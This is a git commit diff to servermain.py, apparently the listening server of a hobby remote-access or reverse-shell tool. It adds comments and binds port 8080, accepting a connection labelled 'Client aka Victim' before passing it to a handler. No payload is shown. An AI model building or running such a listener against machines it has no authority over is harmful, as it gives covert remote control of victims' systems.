58e155c8ccdd142d52c278363b4e0fe4c165de74
Debjeet Banerjee <debjeetbanerjee06042001@gmail.com>
2020-09-23 14:39:27 +0530

    Update servermain.py

--- Server/servermain.py
+++ Server/servermain.py
@@ -1,18 +1,27 @@
+#import the libraries.
 from Server import *
 from serverconnectionhandler import *
 import hashlib
-from password import *
+from password import check_password
 
+#Create Socket Object
 my_socket = ServerConnection()
-port = 8080
+port = 8080 #Change This
+
 my_socket.CreateConnection(port)
 print(f"[+] Creating Socket And Binding It To Port {port}")
-my_socket.Listen(3)
+
+my_socket.Listen(3)#Max Number Of Connections To Listen To Set to 3
 print("[+] Socket Is Listening For Connections")
+
+#Receive Connection From Client aka Victim
 my_conn , addr= my_socket.AcceptConnection()
 print(f"[+] Connected To {addr[0]} On Port {addr[1]}")
+
+#Check Password 
 my_socket.send_data("[+] Success")
 flagval = check_password(my_socket)
+
 if flagval == 1 :
      print(my_socket.recv_data())
      serverhandler(my_socket)
